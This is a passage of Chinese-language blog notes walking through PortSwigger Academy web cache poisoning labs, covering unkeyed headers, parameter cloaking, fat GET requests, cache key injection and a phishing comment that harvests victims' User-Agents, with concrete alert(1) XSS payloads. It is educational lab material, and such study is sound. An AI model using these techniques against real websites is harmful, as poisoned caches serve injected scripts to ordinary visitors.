<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/FoundXHostByPara.png" class="">

<ul>
<li>在 HTTP Request 标头中添加 <code>X-Host</code>，证明存在 Web Cache 投毒</li>
</ul>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/XHostRequest.png" class="">

<p>接着，制作 Payload</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ManyHTTPHeaderEXP.png" class="">

<p>尝试了与之前一致的攻击手段，无法攻击成功，后来看了 Solution 才知道与 <code>Vary 头</code> 有关系，因为此处的 <code>User-Agent</code> 也是缓存键，我们去到 Blog 文章下发送一段钓鱼性质的评论，钓到其他人的 User-Agent。</p>
<p>payload:</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://your-exploit-server-id.web-security-academy.net/foo<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/FishingUA.png" class="">

<p>再去到 <code>Access Log</code> 当中复制受害者的 UA。每隔几秒刷新一次页面，直到看到不同用户（ip不同）发出的请求。我们把受害者的 UA 粘贴进去，再进行如上的攻击。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/UAget.png" class="">

<p>接着替换 UA，并发包</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/UASuccess.png" class="">

<h3 id="5-对-DOM-型漏洞进行-Web-Cache-投毒"><a href="#5-对-DOM-型漏洞进行-Web-Cache-投毒" class="headerlink" title="5. 对 DOM 型漏洞进行 Web Cache 投毒"></a>5. 对 DOM 型漏洞进行 Web Cache 投毒</h3><p>不仅可以通过 Web Cache 投毒 JS 文件，还可以导入恶意的 JSON 字符串，例如</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"someProperty"</span> <span class="token operator">:</span> <span class="token string">"&lt;svg onload=alert(1)>"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果这条 Payload 被传递到恶意的 sink 就可能触发基于 DOM 的漏洞，如果想要让网站加载恶意 JSON 就需要 CORS 授权允许跨站。我们以这一 HTTP 请求举例进行说明。</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">HTTP&#x2F;1.1 200 OK 
Content-Type: application&#x2F;json 
Access-Control-Allow-Origin: * 
&#123; 
    &quot;malicious json&quot; : &quot;malicious json&quot; 
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>这一种攻击方式对代码审计的要求比较高，大家可以耐心看一看。</li>
</ul>
<blockquote>
<h5 id="Lab-Web-cache-poisoning-to-exploit-a-DOM-vulnerability-via-a-cache-with-strict-cacheability-criteria"><a href="#Lab-Web-cache-poisoning-to-exploit-a-DOM-vulnerability-via-a-cache-with-strict-cacheability-criteria" class="headerlink" title="Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria">Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria</a></h5></blockquote>
<p>使用 Param Miner 进行扫描，使用 Param Miner 扫描比较慢，不要着急 ~ ；最后发现在接口 <code>/</code> 中存在 Web Cache Poisoning，且可伪造字段为 <code>X-Forwarded-Host</code></p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/DOMFoundParaminer.png" class="">

<ul>
<li>在 Repeater 当中尝试 <code>X-Forwarded-Host</code> 头，发包。</li>
</ul>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/DOMBagSend.png" class="">

<p>这里 data json 当中，”host” 到底作为何用，我们去追踪一下。后续发现此标头会覆盖 data.host 传递给 initGeoLocate() 函数的变量。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/JSONDataUse.png" class="">

<p>那也就是说，这里的 <code>initGeoLocate(&#39;//&#39; + data.host + &#39;/resources/json/geolocate.json&#39;</code>，传入的 JSON 数据容易受到 DOM 型 XSS 的攻击。我们转战那一容易受到影响的 JSON 文件。</p>
<ul>
<li>根据我们前文所说的需要启用 CORS，我们去到 Exploit Server 处，在头部添加 ACAO，并写下 Payload。Payload 添加一个 JSON 对象，值为 DOM 型 XSS 的 Payload。</li>
</ul>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/DOMCachePayload.png" class="">

<p>接着还是以之前的攻击方式 ———— 添加一个未被键入的参数，发包直至 Cache 为 hit；再删除参数，发包直至 Cache 为 hit。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/DOMCacheSolved.png" class="">

<h3 id="6-Web-Cache-完整投毒过程学习"><a href="#6-Web-Cache-完整投毒过程学习" class="headerlink" title="6. Web Cache 完整投毒过程学习"></a>6. Web Cache 完整投毒过程学习</h3><ul>
<li>这里是 Port 给我们尝试综合性 Web Cache 投毒的一中学习方式。将上面的攻击手段结合&#x2F;综合到一起来。</li>
</ul>
<blockquote>
<h5 id="Lab-Combining-web-cache-poisoning-vulnerabilities"><a href="#Lab-Combining-web-cache-poisoning-vulnerabilities" class="headerlink" title="Lab: Combining web cache poisoning vulnerabilities"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities">Lab: Combining web cache poisoning vulnerabilities</a></h5></blockquote>
<p>进入靶场抓包，使用 Param Miner 探测 Web Cache，探测结果出 HTTP 包支持 X-Forwarded-Host 和 X-Original-URL 标头。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/MixedCacheFound.png" class="">

<p>修改 <code>X-Forwarded-Host</code> 的值，发包。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/MixedCache.png" class="">

<p>这里 host 被修改为了我们输入的 <code>X-Forwarded-Host</code>，和上一题一样，我们去查找 <code>host</code> 被用于何处。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/MixedCacheCodeLook.png" class="">

<p>如此，我们去到 <code>/resources/json/translations.json</code> 代码审计。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/FunctionCode.png" class="">

<p><strong>Translations.js</strong></p>
<p>因为只翻译首页，所以所谓的翻译就是一对一的替换，然后我们留意一下红框部分，就是说除了英语其他的都会执行翻译，也就是说除了英语以外的我们都能用来插入 DOM-XSS 语句。<br>考虑到乱码问题，我们选择 en-gb 这个，虽然也是英语，但是因为代码里严格匹配 en，所以这个也是可以用来插入的，而且也不用考虑乱码的问题，现在我们去 Exploit Server 写入 DOM 型 XSS 的 Payload。</p>
<p>Payload 如图所示</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/MixedPayload.png" class="">

<p>通过选取 Language 为 espanol 抓取接口为 <code>/?localized=1</code> 这一包，因为你选择翻译的时候会请求这个页面，然后修改 X-Forwarded-Host 字段为 Exploit Server 的，并产生 Web Cache。</p>
<p>但是这是翻译页面，我们需要在首页加入一个 X-Original-URL 字段指向翻译页面，这样访问首页的人就都会被重定向到这个页面了。</p>
<hr>
<h2 id="0x05-基于-Cache-Key-缺陷的-Web-Cache-投毒攻击"><a href="#0x05-基于-Cache-Key-缺陷的-Web-Cache-投毒攻击" class="headerlink" title="0x05 基于 Cache Key 缺陷的 Web Cache 投毒攻击"></a>0x05 基于 Cache Key 缺陷的 Web Cache 投毒攻击</h2><p>传统的攻击经常通过将 Payload 注入查询字符串或者是 URL 路径实现，但是请求行是缓存键，这就导致不可能会有用户发出等效请求，也就接收不到投毒响应缓存。</p>
<ul>
<li><p>但是如果有 CDN 的话，他们会将缓存键内容进行某些处理之后再存入缓存。这些处理一般有一下三种</p>
</li>
<li><p>排除查询字符串</p>
</li>
<li><p>过滤掉特定的查询参数</p>
</li>
<li><p>规范缓存键中的输入</p>
</li>
</ul>
<p>尤其是前两种，即使我们注入 payload 到查询字符串或参数中，用户也可能收到被投毒的响应缓存。</p>
<h4 id="基于-Cache-Key-缺陷的-Web-Cache-投毒的基本步骤"><a href="#基于-Cache-Key-缺陷的-Web-Cache-投毒的基本步骤" class="headerlink" title="基于 Cache Key 缺陷的 Web Cache 投毒的基本步骤"></a>基于 Cache Key 缺陷的 Web Cache 投毒的基本步骤</h4><blockquote>
<p>基于 Cache Key 缺陷的 Web Cache 投毒一般三步走</p>
</blockquote>
<h5 id="1-辨认接收到的响应是来自缓存还是服务器"><a href="#1-辨认接收到的响应是来自缓存还是服务器" class="headerlink" title="1. 辨认接收到的响应是来自缓存还是服务器"></a>1. 辨认接收到的响应是来自缓存还是服务器</h5><p>这一步被称作辨认 Cache oracle，国内暂时也有很多文章对这一用词进行翻译与解释，我个人把它作为一种简单的反馈辨认。</p>
<ul>
<li>我们需要知道我们接收到的响应是来自缓存还是服务器。</li>
</ul>
<p>这一反馈可以从如下三种地方获得。</p>
<p>1)某些 HTTP 头。<br>2)网页中能够欸我们修改的地方，例如添加评论这种行为。<br>3)不同的响应时间 —— 可以理解为 SQL 注入当中的时间盲注类似。</p>
<p>有的时候应用程序会使用第三方的缓存组件，此时可以通过查阅相关文档的方式得知缓存的过程。例如，基于 Akamai 的网站可能支持 <code>Pragma：akamai-x-get-cache-key</code>，它可以在响应标头中显示缓存键。</p>
<h5 id="2-观察缓存对缓存键是否有其他的处理"><a href="#2-观察缓存对缓存键是否有其他的处理" class="headerlink" title="2. 观察缓存对缓存键是否有其他的处理"></a>2. 观察缓存对缓存键是否有其他的处理</h5><p>比如剔除 Host 中的端口号等，我们以下面这一 HTTP 请求为例，在这一 HTTP 请求当中，Host 值会被动态拼接进 Location 中。</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F; HTTP&#x2F;1.1 
Host: vulnerable-website.com 

HTTP&#x2F;1.1 302 Moved Permanently 
Location: https:&#x2F;&#x2F;vulnerable-website.com&#x2F;en 
Cache-Status: miss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>若是对上面的请求添加端口，响应如下</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F; HTTP&#x2F;1.1 
Host: vulnerable-website.com:1337 

HTTP&#x2F;1.1 302 Moved Permanently 
Location: https:&#x2F;&#x2F;vulnerable-website.com:1337&#x2F;en 
Cache-Status: miss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们再去掉端口号重新发送请求</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F; HTTP&#x2F;1.1 
Host: vulnerable-website.com 

HTTP&#x2F;1.1 302 Moved Permanently 
Location: https:&#x2F;&#x2F;vulnerable-website.com:1337&#x2F;en 
Cache-Status: miss<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现已经生成缓存，但是缓存是我们加了端口号发出时的响应版本。这就说明端口号是不会加入缓存键中的。</p>
<h5 id="3-进行漏洞利用"><a href="#3-进行漏洞利用" class="headerlink" title="3. 进行漏洞利用"></a>3. 进行漏洞利用</h5><ul>
<li>前文我们说到 Web Cache 投毒这一攻击手段是用来扩大战果的，所以最后一步我们需要将漏洞与 Web Cache 投毒联合使用。</li>
</ul>
<p>上述为基于 Web Cache 键( Key ) 缺陷的一些漏洞，我们接下来详细学习一下攻击手段。</p>
<hr>
<h3 id="1-通过未被缓存的端口进行攻击"><a href="#1-通过未被缓存的端口进行攻击" class="headerlink" title="1. 通过未被缓存的端口进行攻击"></a>1. 通过未被缓存的端口进行攻击</h3><p>缓存键可能只会缓存域名或主机名而不缓存端口号。<br>所以我们可以利用这个特点发动如 DDOS (向任意端口号发出大量请求)，若网站允许端口不为数字，则我们可以进行 XSS 攻击。</p>
<h3 id="2-通过未被缓存的查询字符串攻击"><a href="#2-通过未被缓存的查询字符串攻击" class="headerlink" title="2. 通过未被缓存的查询字符串攻击"></a>2. 通过未被缓存的查询字符串攻击</h3><p>若查询的字符串未被键入，则发送的查询字符串即使值不同也会产生相同的响应缓存，这就产生了等效请求。</p>
<p>基本的攻击手段 ———— 比如是一个 GET 请求，我们在接口处添加此参数  <code>?evil=&#39;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，这一段字符串若未被缓存，则其他用户也会因为等效请求而受到攻击。</p>
<h4 id="探测不被缓存的查询字符串"><a href="#探测不被缓存的查询字符串" class="headerlink" title="探测不被缓存的查询字符串"></a>探测不被缓存的查询字符串</h4><p>有的 Web 程序并不会在回显中反映出是否产生了缓存，我们可以在其他请求头中下手，例如加在 Accept-Encoding 字段中</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">Accept-Encoding: gzip, deflate, cachebuster 
Accept: *&#x2F;*, text&#x2F;cachebuster 
Cookie: cachebuster&#x3D;1 
Origin: https:&#x2F;&#x2F;cachebuster.vulnerable-website.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>其实也可以在 Param Miner 开启动态的缓存粉碎机(cachebuster)。还有一种办法就是修改不同的路径，但是仍然可以的到相同的响应缓存。对应不同的系统有着不同的路径</p>
<blockquote>
<p>Apache: GET &#x2F;&#x2F;<br>Nginx: GET &#x2F;%2F<br>PHP: GET &#x2F;index.php&#x2F;xyz<br>.NET GET &#x2F;(A(xyz)&#x2F;</p>
</blockquote>
<h4 id="Exploit-of-不被缓存的查询字符串"><a href="#Exploit-of-不被缓存的查询字符串" class="headerlink" title="Exploit of 不被缓存的查询字符串"></a>Exploit of 不被缓存的查询字符串</h4><p>查询字符串不被缓存会扩大 XSS 的攻击影响，因为附有 XSS  Payload 的查询字符串的请求在缓存看来与普通请求无异，但是普通用户可能就会接收到被投毒的响应缓存，这就产生了等效请求。</p>
<blockquote>
<h5 id="Lab-Web-cache-poisoning-via-an-unkeyed-query-string"><a href="#Lab-Web-cache-poisoning-via-an-unkeyed-query-string" class="headerlink" title="Lab: Web cache poisoning via an unkeyed query string)"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query">Lab: Web cache poisoning via an unkeyed query string)</a></h5></blockquote>
<ul>
<li>先抓包，去到 <code>/</code> 这一接口。使用我们上述的攻击手段，在 GET 请求的参数中添加 <code>?evil=&#39;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> 即可，记得发包至 <code>X-Cache: hit</code> 的状态哦 ~</li>
</ul>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/UnkeyedString.png" class="">

<h3 id="3-仅有几个不被缓存的查询参数时"><a href="#3-仅有几个不被缓存的查询参数时" class="headerlink" title="3. 仅有几个不被缓存的查询参数时"></a>3. 仅有几个不被缓存的查询参数时</h3><p>在上一攻击手段当中，我们直接输入 <code>?evil</code> 作为查询参数也能够成功发送请求，但在很多 Web 程序当中会对查询参数进行限制；又或者会将仅仅几个参数执行不缓存的操作。</p>
<p>这时就需要用到 Fuzz 测试，我们先探测一下哪些查询参数是可以被利用的，再对这些可利用的参数进行是否会被缓存的测试。</p>
<ul>
<li>但是这样一来，因为能够利用的参数有限，所以我们造成的攻击面也会少几分。</li>
</ul>
<blockquote>
<h5 id="Lab-Web-cache-poisoning-via-an-unkeyed-query-parameter"><a href="#Lab-Web-cache-poisoning-via-an-unkeyed-query-parameter" class="headerlink" title="Lab: Web cache poisoning via an unkeyed query parameter"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param">Lab: Web cache poisoning via an unkeyed query parameter</a></h5></blockquote>
<ul>
<li>这里的 Fuzz 过程我就先跳过啦，最后得出可用的参数为 <code>utm_content</code>，构造 Payload</li>
</ul>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">&#x2F;?utm_content&#x3D;&#39;&#x2F;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>记得发包至 <code>X-Cache: hit</code> 的状态</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/UnkeyedOnlyA.png" class="">

<h3 id="4-利用多个参数实现缓存参数隐藏"><a href="#4-利用多个参数实现缓存参数隐藏" class="headerlink" title="4. 利用多个参数实现缓存参数隐藏"></a>4. 利用多个参数实现缓存参数隐藏</h3><ul>
<li><p>听着很高深，实际很简单：通过 GET 请求的问号(<strong>?</strong>)进行攻击。我们都知道 GET 请求的参数都是通过问号来传递的。</p>
</li>
<li><p>如果一个 GET 请求中有多个问号，就会以第一个问号作为查询参数的开始，后面的问号中的参数就不会被作为缓存键处理。我们以下面一个 GET 请求作为例子进行说明。</p>
</li>
</ul>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;?example&#x3D;123?excluded_param&#x3D;bad-stuff-here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这时，excluded_param 就不会被作为缓存键处理。</p>
<p>有些框架比较特殊，例如 Ruby on Rails 框架将与(&amp;)和分号 (;)作为参数分隔符。但是如果缓存不支持这样解析参数，就会造成差异。</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;?keyed_param&#x3D;abc&amp;excluded_param&#x3D;123;keyed_param&#x3D;bad-stuff-here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>以此请求为例，eyed_param 就会被视为缓存键，而excluded_param 不会，而且只会被缓存解析成两个参数。</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">keyed_param&#x3D;abc 
excluded_param&#x3D;123;keyed_param&#x3D;bad-stuff-here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>会被 Ruby on Rails 进一步解析成三个参数</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">keyed_param&#x3D;abc 
excluded_param&#x3D;123 
keyed_param&#x3D;bad-stuff-here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>此时 keyed_param 的值就会被覆盖为 bad-stuff-here，也会得到由这个值生成的响应，但是在缓存看来只要该参数值为 abc 的都会被视为该响应的等效请求。利用这种特点可以发动 JSONP 攻击，它会将回调函数名附在查询参数中。</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;jsonp?callback&#x3D;innocentFunction<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们可以利用上面的特点替换成我们指定的函数名。</p>
<blockquote>
<h5 id="Lab-Parameter-cloaking"><a href="#Lab-Parameter-cloaking" class="headerlink" title="Lab: Parameter cloaking"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking">Lab: Parameter cloaking</a></h5></blockquote>
<p>有了上面的学习过程，做起靶场来健步如飞(诶好像我的比喻不太恰当)。</p>
<p>抓包定位于 <strong>“GET &#x2F;js&#x2F;geolocate.js?callback&#x3D;setCountryCookie”</strong></p>
<p>在执行 Web Cache 投毒攻击之前，我们需要先确定所用的框架 ———— 例如 Ruby on Rails 框架，这是为了构造对应的 Payload。其次进行 Fuzz 测试，探测一下可攻击的查询关键字。</p>
<ul>
<li>探测过程先行省略，这里挂一下 Payload</li>
</ul>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;js&#x2F;geolocate.js?callback&#x3D;setCountryCookie&amp;utm_content&#x3D;foo;callback&#x3D;alert(1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>记得发包至 <code>X-Cache: hit</code> 的状态</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/ParaCloking.png" class="">

<h3 id="5-利用-Fat-GET-请求发起攻击"><a href="#5-利用-Fat-GET-请求发起攻击" class="headerlink" title="5. 利用 Fat GET 请求发起攻击"></a>5. 利用 Fat GET 请求发起攻击</h3><p>Fat GET 请求，可以有两个参数值，一个放在问号后面，另外一个在 HTTP Body 当中，如下 HTTP 请求所示。这里的 <code>param</code> 会成功覆盖 <code>?param=innocent</code> 使得 <code>param</code> 成为 <code>bad-stuff-here</code></p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;?param&#x3D;innocent HTTP&#x2F;1.1 
… 
param&#x3D;bad-stuff-here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如果 X-HTTP-Method-Override 头也是非缓存键，我们可以构造伪 POST 请求来攻击，例如</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;?param&#x3D;innocent HTTP&#x2F;1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param&#x3D;bad-stuff-here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<h5 id="Lab-Web-cache-poisoning-via-a-fat-GET-request"><a href="#Lab-Web-cache-poisoning-via-a-fat-GET-request" class="headerlink" title="Lab: Web cache poisoning via a fat GET request"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get">Lab: Web cache poisoning via a fat GET request</a></h5></blockquote>
<p>实现起来也比较简单，这里便直接挂 Payload，但是实战渗透的时候别忘记 Fuzz 测试。</p>
<p>发包接口 <strong><code>/js/geolocate.js</code></strong></p>
<ul>
<li>这里有个小坑 —— <code>callback=alert(1)</code> 需要放到 Connection 后两行，不然会发包失败。</li>
</ul>
<p>还有一个小坑，这里发包之前要先修改 <code>callback</code> 为随意数据，将 setCountryCookie 修改之后才能将 callback 赋值为 <code>alert(1)</code>。</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/FatGETDo.png" class="">

<p>这样的攻击方法在缓存看来直接访问首页的人会被识别成等效页面而接收到缓存副本，在后台看来会识别成 POST 方法而读取覆盖之后的 callback 参数的值而返回投毒响应，从而使得投毒生效。</p>
<p>如此发包之后，再将 callback 修改为我们的 Payload</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">callback&#x3D;alert(1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里我直接把数据包发到 Intruder 下，使用 Null Payloads 发包解决 ~</p>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/FatGETSolved.png" class="">

<h3 id="6-利用资源导入中的动态内容进行攻击"><a href="#6-利用资源导入中的动态内容进行攻击" class="headerlink" title="6. 利用资源导入中的动态内容进行攻击"></a>6. 利用资源导入中的动态内容进行攻击</h3><p>有的时候虽然看上去是导入静态文件，但是也可以向查询字符串中注入恶意 payload 构造某些攻击，例如下面这个 HTTP 请求。</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;style.css?excluded_param&#x3D;123);@import… HTTP&#x2F;1.1 

HTTP&#x2F;1.1 200 OK 
… 
@import url(&#x2F;site&#x2F;home&#x2F;index.part1.8a6715a2.css?excluded_param&#x3D;123);@import…<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>甚至可以尝试 XSS payload</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;style.css?excluded_param&#x3D;alert(1)%0A&#123;&#125;*&#123;color:red;&#125; HTTP&#x2F;1.1 

HTTP&#x2F;1.1 200 OK 
Content-Type: text&#x2F;html 
… 
This request was blocked due to…alert(1)&#123;&#125;*&#123;color:red;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="7-缓存解析-URL-编码的隐患"><a href="#7-缓存解析-URL-编码的隐患" class="headerlink" title="7. 缓存解析 URL 编码的隐患"></a>7. 缓存解析 URL 编码的隐患</h3><p>原本的 XSS 攻击里面，是不能使用 URL 编码进行绕过的，如果使用 URL 编码是不会被后端所解析的；但是缓存不同，会自动进行 URL 解码。</p>
<p>我们 在Web 缓存还处于生效，给受害者投放带 Payload 的 URL 即可。</p>
<blockquote>
<h5 id="Lab-URL-normalization"><a href="#Lab-URL-normalization" class="headerlink" title="Lab: URL normalization"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization">Lab: URL normalization</a></h5></blockquote>
<img src="/2022/04/28/PortSwigger-WebCache%E4%B8%AD%E6%AF%92%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/URLCode.png" class="">

<h3 id="8-缓存键注入"><a href="#8-缓存键注入" class="headerlink" title="8. 缓存键注入"></a>8. 缓存键注入</h3><p>我们还可以利用双下划线(__)分隔不同的字段，让两个不同的请求识别为等效请求。</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;path?param&#x3D;123 HTTP&#x2F;1.1 
Origin: &#39;-alert(1)-&#39;__ 

HTTP&#x2F;1.1 200 OK 
X-Cache-Key: &#x2F;path?param&#x3D;123__Origin&#x3D;&#39;-alert(1)-&#39;__ 
...

&lt;script&gt;…&#39;-alert(1)-&#39;…&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>下面这一请求则是等效请求，会造成 Web Cache 投毒</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;path?param&#x3D;123__Origin&#x3D;&#39;-alert(1)-&#39;__ HTTP&#x2F;1.1 

HTTP&#x2F;1.1 200 OK 
X-Cache-Key: &#x2F;path?param&#x3D;123__Origin&#x3D;&#39;-alert(1)-&#39;__ 
X-Cache: hit 

...

&lt;script&gt;…&#39;-alert(1)-&#39;…&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<h5 id="Lab-Cache-key-injection"><a href="#Lab-Cache-key-injection" class="headerlink" title="Lab: Cache key injection)"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection">Lab: Cache key injection)</a></h5></blockquote>
<p>这道题目比较难，如果只是以了解为主的同学可以放一放。</p>
<p>我们需要构造一条 Web Cache 投毒链，因为访问首页会自动跳转到 &#x2F;login，所以我们需要先在 &#x2F;js&#x2F;localize.js 中构造 Payload 然后在 &#x2F;login 构造 Payload。</p>
<p>经过 Fuzz 测试，utm_content 和 Origin 的值是可控的，但是 URL 里面的 x 就只能是 x&#x3D;1，这个 x&#x3D;1 是开启缓存功能的开关。</p>
<p>我们先看 &#x2F;js&#x2F;localize.js 中构造的 Payload</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">GET &#x2F;js&#x2F;localize.js?lang&#x3D;en?utm_content&#x3D;z&amp;cors&#x3D;1&amp;x&#x3D;1 HTTP&#x2F;1.1 
